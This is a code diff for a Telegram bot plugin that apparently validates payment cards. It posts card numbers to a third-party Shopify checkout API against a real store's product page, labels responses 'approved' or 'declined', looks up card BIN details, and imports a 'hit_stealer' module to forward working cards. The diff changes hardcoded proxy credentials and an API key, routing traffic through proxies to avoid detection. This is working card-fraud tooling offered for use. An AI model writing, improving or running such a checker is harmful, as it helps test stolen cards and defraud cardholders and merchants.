@@ -1,7 +1,7 @@
 from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from pyrogram.enums import ChatType
-import httpx, re, time, json
+import httpx, re, time
 from httpx import AsyncHTTPTransport
 from plugins.func.users_sql import fetchinfo, updatedata, plan_expirychk
 from plugins.tools.hit_stealer import send_hit_if_approved
@@ -65,37 +65,49 @@ f"""<code>┏━━━━━━━⍟</code>
 
         tic = time.perf_counter()
 
-        proxy_url = "http://Indexui184a999e:4fba9e5235e8@proxy.speedproxies.net:12321"
-        transport = AsyncHTTPTransport(proxy=proxy_url)
-
         try:
-            async with httpx.AsyncClient(transport=transport, timeout=30) as http_client:
+            async with httpx.AsyncClient(timeout=30) as http_client:
+                headers = {
+                    "Content-Type": "application/json",
+                    "Accept": "application/json",
+                    "User-Agent": "Mozilla/5.0"
+                }
                 payload = {
                     "key": "VDX-SHA2X-NZ0RS-O7HAM",
                     "data": {
                         "card": fullcc,
-                        "product_url": "https://godless.com/collections/the-drop-all-new-shit/products/dark-corners-on-flat-surfaces-by-adler-tittle",
+                        "product_url": "https://godless.com/products/dark-corners-on-flat-surfaces-by-adler-tittle",
                         "email": None,
-                        "proxy": "proxy.speedproxies.net:12321:Indexui184a999e:4fba9e5235e8_country-us",
+                        "proxy": "207.244.217.165:6712:pyrcqush:elcth08m9maj",
                         "ship_address": None,
                         "is_shippable": False
                     }
                 }
-                res = await http_client.post("https://api.voidapi.xyz/v2/shopify_graphql", json=payload)
+                res = await http_client.post("https://api.voidapi.xyz/v2/shopify_graphql", json=payload, headers=headers)
                 data = res.json()
                 raw_msg = data.get("message") or data.get("error") or "No response"
                 msg_check = raw_msg.lower()
                 card_status = "approved" if any(x in msg_check for x in ["processedreceipt", "zip", "avs", "incorrect_cvc", "insufficient", "charged"]) else "declined"
                 card_message = raw_msg
 
-                binres = await http_client.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}")
-                bininfo = binres.json()
-                brand = str(bininfo.get("brand") or bininfo.get("scheme") or "N/A").upper()
-                type_ = str(bininfo.get("type", "N/A")).upper()
-                level = str(bininfo.get("level", "N/A")).upper()
-                bank = str(bininfo.get("bank", "N/A")).upper()
-                country = str(bininfo.get("country_name", "N/A")).upper()
-                flag = bininfo.get("country_flag", "🏳️")
+            # BIN Info using proxy with AsyncHTTPTransport
+            try:
+                bin_proxy_url = "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000"
+                bin_transport = AsyncHTTPTransport(proxy=bin_proxy_url)
+
+                async with httpx.AsyncClient(transport=bin_transport, timeout=15) as bin_client:
+                    binres = await bin_client.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}")
+                    bininfo = binres.json()
+                    brand = str(bininfo.get("brand") or bininfo.get("scheme") or "N/A").upper()
+                    type_ = str(bininfo.get("type", "N/A")).upper()
+                    level = str(bininfo.get("level", "N/A")).upper()
+                    bank = str(bininfo.get("bank", "N/A")).upper()
+                    country = str(bininfo.get("country_name", "N/A")).upper()
+                    flag = bininfo.get("country_flag", "🏳️")
+            except Exception:
+                brand = type_ = level = bank = country = "N/A"
+                flag = "🏳️"
+
         except Exception as e:
             card_status = "error"
             card_message = f"Request failed: {e}"
